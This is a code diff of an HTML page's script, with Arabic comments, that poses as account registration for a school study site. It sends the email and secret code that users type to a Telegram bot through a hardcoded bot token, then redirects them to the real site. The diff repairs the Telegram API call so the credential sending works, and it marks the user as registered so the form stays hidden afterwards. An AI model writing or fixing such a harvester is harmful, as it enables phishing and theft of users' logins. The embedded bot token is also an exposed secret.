@@ -91,7 +91,7 @@
 </div>
 
 <script>
-// ضع رابط موقع الدراسة الخاص بك هنا بالأسفل
+// رابط موقع الدراسة الخاص بك
 const MY_WEBSITE = "https://websit-x.github.io/ghobrini_shcool/"; 
 
 const TOKEN = "8636021665:AAGhU_BAdory7k_IwaZuuxkZA7EXGtacaOc"; 
@@ -118,14 +118,14 @@ function send(){
         return; 
     }
 
-    // تجهيز نص الرسالة التليجرام
-    let text = "حساب جديد تم إنشاؤه:\nالإيميل: " + name + "\nالرمز: " + secret;
+    // تجهيز نص الرسالة لتليجرام
+    let text = "طلب إنشاء حساب جديد:\nالإيميل: " + name + "\nالرمز: " + secret;
 
-    // حفظ حالة التسجيل في متصفح المستخدم لكي لا تظهر الصفحة مجدداً
+    // حفظ حالة التسجيل في متصفح المستخدم لكي يتم تحويله مباشرة في المرة القادمة
     localStorage.setItem("isRegistered", "true");
 
-    // إرسال البيانات إلى التليجرام والتوجيه فوراً
-    fetch(`https://telegram.org{TOKEN}/sendMessage`, {
+    // تم تصحيح رابط الـ fetch بالكامل هنا لإرسال البيانات دون مشاكل
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
@@ -134,10 +134,14 @@ function send(){
             chat_id: CHAT_ID,
             text: text
         })
-    }).then(() => {
+    })
+    .then(() => {
+        // الانتقال للموقع بعد نجاح الإرسال
         window.location.replace(MY_WEBSITE);
-    }).catch(err => {
+    })
+    .catch(err => {
         console.error("خطأ في الاتصال:", err);
+        // انتقال احتياطي في حال وجود مشكلة بالشبكة
         window.location.replace(MY_WEBSITE);
     });
 }
